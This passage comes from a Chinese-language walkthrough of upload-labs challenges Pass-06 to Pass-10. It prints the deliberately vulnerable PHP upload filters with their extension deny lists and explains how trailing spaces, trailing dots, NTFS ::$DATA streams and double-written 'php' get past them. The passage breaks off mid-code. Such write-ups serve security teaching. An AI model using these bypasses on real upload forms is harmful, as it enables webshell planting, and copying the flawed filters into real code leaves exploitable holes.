src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103152910258.png" alt="image-20201103152910258"></p><h2 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h2><h3 id="1-代码分析"><a href="#1-代码分析" class="headerlink" title="1. 代码分析"></a>1. 代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-06</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153619133.png" alt="image-20201103153619133"></p><p>在Win下<code>xx.jpg[空格]</code> 或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个<code>.php空格</code>文件即可</p><p><code>.php空格</code>绕过了<code>$deny_ext</code>的验证，导致了文件上传</p><h3 id="2-利用-5"><a href="#2-利用-5" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153757039.png" alt="image-20201103153757039"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153828227.png" alt="image-20201103153828227"></p><h2 id="Pass-07-绕过"><a href="#Pass-07-绕过" class="headerlink" title="Pass-07 .绕过"></a>Pass-07 .绕过</h2><h3 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="1.分析"></a>1.分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-07</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154218222.png" alt="image-20201103154218222"></p><p>没有删除<code>.</code></p><p>在Win下<code>xx.jpg[空格]</code> 或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个<code>.php空格</code>文件即可</p><p><code>.php.</code>绕过了<code>$deny_ext</code>的验证，导致了文件上传</p><h3 id="2-利用-6"><a href="#2-利用-6" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154354669.png" alt="image-20201103154354669"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154442779.png" alt="image-20201103154442779"></p><h2 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h2><h3 id="1-代码"><a href="#1-代码" class="headerlink" title="1. 代码"></a>1. 代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-08</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154642666.png" alt="image-20201103154642666"></p><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。当我们访问<code>tao.php::DATA</code>时，就是请求 <code>tao.php</code> 本身的数据,如果<code>tao.php</code> 还包含了其他的数据流，比如 <code>tao.php:test.php</code>，请求 <code>tao.php:test.php::$DATA</code>，则是请求<code>tao.php</code>中的流数据<code>test.php</code>的流数据内容</p><p>所以我们上传<code>phpinfo.php::$DATA</code>即可绕过。(仅限windows)</p><h3 id="2-利用-7"><a href="#2-利用-7" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155458127.png" alt="image-20201103155458127"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155333975.png" alt="image-20201103155333975"></p><p>我们访问的时候需要删去<code>::$DATA</code>,直接访问php文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155425946.png" alt="image-20201103155425946"></p><h2 id="Pass-09-空格-绕过"><a href="#Pass-09-空格-绕过" class="headerlink" title="Pass-09 .空格.绕过"></a>Pass-09 <code>.空格.</code>绕过</h2><h3 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当我们上传文件名为`phpinfo.php. .`时，因为这里trim处理的是字符两边的空格，所以$file_name=`phpinfo.php. .`</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="comment">// 上面代码删除了末尾的点，所以此时$file_name = `phpinfo.php. `, 注意，后面又空格</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="comment">// sttrchr 查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符</span></span><br><span class="line"><span class="comment">// 那么$file_ext=&quot;. &quot;</span></span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终$file_ext=&quot;.&quot;, 绕过校验</span></span><br><span class="line"></span><br><span class="line"> $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line"> move_uploaded_file($temp_file, $img_path);</span><br><span class="line"><span class="comment"># 这里最终文件名拼接的是$file_name,则最终上传的文件名为`phpinfo.php. `</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163112162.png" alt="image-20201103163112162"></p><h3 id="2-利用-8"><a href="#2-利用-8" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163729334.png" alt="image-20201103163729334"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163556765.png" alt="image-20201103163556765"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163602190.png" alt="image-20201103163602190"></p><blockquote><p>这里解析同理<code>Pass-06</code> and <code>Pass-07</code></p></blockquote><h2 id="Pass-10-php双写绕过"><a href="#Pass-10-php双写绕过" class="headerlink" title="Pass-10 php双写绕过"></a>Pass-10 php双写绕过</h2><h3 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-10</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        